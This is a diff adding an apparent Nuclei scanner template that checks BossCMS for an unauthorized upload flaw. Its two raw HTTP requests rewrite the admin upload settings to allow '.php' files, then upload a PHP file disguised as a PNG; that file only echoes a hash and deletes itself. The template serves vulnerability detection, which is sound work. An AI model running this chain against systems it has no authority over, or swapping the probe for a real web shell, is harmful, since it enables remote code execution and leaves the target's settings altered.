@@ -1,0 +1,84 @@
+id: bosscms-unauthorized-upload
+info:
+  name: bosscms-unauthorized-upload
+  author: apple
+  severity: critical
+  description: description
+  reference:
+    - https://github.com/n0Sleeper/bosscmsVuln/issues/1
+  tags: tags
+http:
+  - raw:
+      - |
+        POST /admin/?mold=safe&part=safe&func=add HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 987
+        Cache-Control: max-age=0
+        Upgrade-Insecure-Requests: 1
+        Origin: http://{{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary3lx1iXdeI4VAR3JB
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Referer: http://{{Hostname}}/admin/?mold=safe&part=safe&func=init&lang=1
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+
+        ------WebKitFormBoundary3lx1iXdeI4VAR3JB
+        Content-Disposition: form-data; name="admin_folder"
+
+        admin
+        ------WebKitFormBoundary3lx1iXdeI4VAR3JB
+        Content-Disposition: form-data; name="admin_login_captcha"
+
+        1
+        ------WebKitFormBoundary3lx1iXdeI4VAR3JB
+        Content-Disposition: form-data; name="admin_logout_time"
+
+        28888
+        ------WebKitFormBoundary3lx1iXdeI4VAR3JB
+        Content-Disposition: form-data; name="page_cache_time"
+
+        0
+        ------WebKitFormBoundary3lx1iXdeI4VAR3JB
+        Content-Disposition: form-data; name="upload_rename"
+
+        1
+        ------WebKitFormBoundary3lx1iXdeI4VAR3JB
+        Content-Disposition: form-data; name="upload_maxsize"
+
+        2
+        ------WebKitFormBoundary3lx1iXdeI4VAR3JB
+        Content-Disposition: form-data; name="upload_extension"
+
+        [".jpg",".png",".jpeg",".gif",".mp4",".mp3",".pdf",".doc",".xls",".xlsx",".bmp",".csv",".ico",".JPG",".php"]
+        ------WebKitFormBoundary3lx1iXdeI4VAR3JB
+        Content-Disposition: form-data; name="ueditor_catchimage"
+
+        0
+        ------WebKitFormBoundary3lx1iXdeI4VAR3JB--
+      - |
+        POST /system/extend/ueditor/php/controller.php?action=uploadfile HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 265
+        Accept: application/json, text/javascript, */*; q=0.01
+        X-Requested-With: XMLHttpRequest
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryYgQTzptzUMcQavaQ
+        Origin: http://{{Hostname}}
+        Referer: http://{{Hostname}}/admin/?mold=items&part=items&func=edit&id=54
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+
+        ------WebKitFormBoundaryYgQTzptzUMcQavaQ
+        Content-Disposition: form-data; name="upfile"; filename="289039345-4fe3cfc9-9e83-4320-be4e-882442fab3b6.php"
+        Content-Type: image/png
+
+        <?php echo(md5(1)); unlink(__FILE__); ?>
+        ------WebKitFormBoundaryYgQTzptzUMcQavaQ--
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"state":"SUCCESS"'
